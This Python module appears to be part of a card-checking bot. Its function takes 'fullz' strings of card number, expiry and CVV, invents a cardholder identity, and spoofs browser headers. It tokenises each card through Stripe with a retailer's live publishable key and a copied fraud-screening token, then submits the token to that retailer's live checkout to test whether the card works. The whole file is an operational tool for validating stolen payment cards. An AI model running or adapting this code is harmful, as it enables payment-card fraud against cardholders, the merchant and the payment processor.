import asyncio
import json
import random
import re
import time
import uuid
from fake_useragent import UserAgent
import requests
from FUNC.defs import *

async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data          = await get_random_info(session)
        fname                = random_data["fname"]
        lname                = random_data["lname"]
        email                = random_data["email"]
        phone                = random_data["phone"]
        add1                 = random_data["add1"]
        city                 = random_data["city"]
        state                = random_data["state"]
        state_short          = random_data["state_short"]
        zip_code             = random_data["zip"]
        user_agent           = UserAgent().random


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
        }

        data={
        'guid':'fd286b17-3ad6-4186-8cd6-e30c9fb40054b2fc13',
        'muid':'e82f0c12-c484-477f-a68f-b92ee16235f3d0faee',
        'sid':'c83ba3f8-01cb-453d-9cfa-28f77e30fae4cfd2be',
        'referrer':'https://ruggedridge.com',
        'time_on_page':'204947',
        'card[name]':'MIKE EDWIN',
        'card[address_line1]':'147 Christopher St',
        'card[address_city]':'New York',
        'card[address_state]':'NY',
        'card[address_zip]':'10014',
        'card[address_country]':'US',
        'card[currency]':'usd',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_month]':mes,
        'card[exp_year]':ano,
        'payment_user_agent':'stripe.js/758ec59c6a; stripe-js-v3/758ec59c6a; card-element',
        'pasted_fields':'number',
        'key':'pk_live_XotCD0jxWE7pAhaCLmt5PC5l'
        }
        
        
        response = await session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)


        # print(response.text)

        try:
             id=response.json()['id']
             card=response.json()['card']['id']
             print(id)
             print(card)
        except:
             return response.text


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://ruggedridge.com',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'x-forter-token': 'dffc43b63e0f4199982c5bcf39ebf059_1740886415351_18_dUAL43-mnts-a4_24ck__tt',
            'x-site': 'rr',
        }

        json_data = {
            'raw': {
                'token': {
                    'id': id,
                    'object': 'token',
                    'card': {
                        'id': card,
                        'object': 'card',
                        'address_city': 'New York',
                        'address_country': 'US',
                        'address_line1': '147 Christopher St',
                        'address_line1_check': 'unchecked',
                        'address_line2': None,
                        'address_state': 'NY',
                        'address_zip': '10014',
                        'address_zip_check': 'unchecked',
                        'brand': 'Visa',
                        'country': 'US',
                        'currency': 'usd',
                        'cvc_check': 'unchecked',
                        'dynamic_last4': None,
                        'exp_month': 11,
                        'exp_year': 2025,
                        'funding': 'credit',
                        'last4': '8220',
                        'name': 'MIKE EDWIN',
                        'networks': {
                            'preferred': None,
                        },
                        'regulated_status': 'unregulated',
                        'tokenization_method': None,
                        'wallet': None,
                    },
                    'client_ip': '49.47.128.255',
                    'created': 1740886692,
                    'livemode': True,
                    'type': 'card',
                    'used': False,
                },
            },
            'token': id,
        }

        response = await session.post(
            'https://uwp.thiecommerce.com/uwp-v3/checkouts/e2a385e4-c481-4535-8f6e-5cc40e2c2347/STRIPE',
            headers=headers,
            json=json_data,
        )

        print(response.text)

        return response.text




    except Exception as e:
        return str(e)